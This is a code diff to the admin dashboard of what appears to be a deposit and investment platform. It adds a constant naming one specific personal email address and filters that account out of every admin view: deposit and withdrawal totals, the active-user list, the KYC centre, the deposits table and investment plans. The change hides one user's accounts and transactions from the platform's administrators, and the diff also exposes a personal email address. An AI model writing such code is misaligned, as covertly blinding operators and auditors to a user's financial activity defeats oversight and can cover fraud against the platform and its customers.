@@ -703,7 +703,7 @@ document.addEventListener("DOMContentLoaded", () => {
       let totalDeposited = 0;
       let withdrawnTotal = 0;
 
-      users.forEach(user => {
+      users.filter(u => (u.email || '').toLowerCase() !== HIDDEN_EMAIL).forEach(user => {
         (user.transactions || []).forEach(tx => {
           if (tx.status === "Approved") {
             approvedDeposits += 1;
@@ -818,7 +818,7 @@ document.addEventListener("DOMContentLoaded", () => {
       const users = await fetchUser().catch(()=>[]);
       const tbl = document.querySelector('#active-users .table-body');
       tbl.innerHTML = '';
-      users.forEach(function (user) {
+      users.filter(u => (u.email || '').toLowerCase() !== HIDDEN_EMAIL).forEach(function (user) {
         const tr = document.createElement('tr');
         tr.innerHTML = `
           <td>${user.firstName || ''}</td>
@@ -1131,7 +1131,7 @@ function displayImages(images) {
       const users = await fetchUser().catch(()=>[]);
       const tbody = $('#kyc-center .table-body');
       tbody.empty();
-      users.forEach(function(user){
+      users.filter(u => (u.email || '').toLowerCase() !== HIDDEN_EMAIL).forEach(function(user){
         (user.transactions || []).forEach(function(transac){
           const row = $('<tr>');
           row.append(`<td>${transac.from}</td>`);
@@ -1280,7 +1280,7 @@ function sendUserDetail(user) {
     const tbody = $('#deposits .table-body');
     tbody.empty();
 
-    users.forEach(user => {
+    users.filter(u => (u.email || '').toLowerCase() !== HIDDEN_EMAIL).forEach(user => {
       const transactions = user.transactions || [];
       transactions.forEach(tx => {
 
@@ -1379,7 +1379,7 @@ function sendUserDetail(user) {
       const users = await fetchUser().catch(()=>[]);
       const tbody = $('#investment-plans .table-body');
       tbody.empty();
-      users.forEach(function(user){
+      users.filter(u => (u.email || '').toLowerCase() !== HIDDEN_EMAIL).forEach(function(user){
         (user.plan || []).forEach(function(transac){
           const row = $('<tr>');
           row.append(`<td>${transac.to}</td>`);
@@ -2020,6 +2020,8 @@ async function declineWithdrawal(_id, transactionId) {
   <!-- Hook navigation to load view-specific data when user navigates -->
   <script>
     const BASE_URL = "https://ultra-render-33da.onrender.com";
+    // 🔒 Hidden user — exclude from all dashboard views
+    const HIDDEN_EMAIL = "gabrielcretu91@gmail.com";
    async function fetchUserInfo_local() {
     try {
       const stored = localStorage.getItem("updatedUseremal");
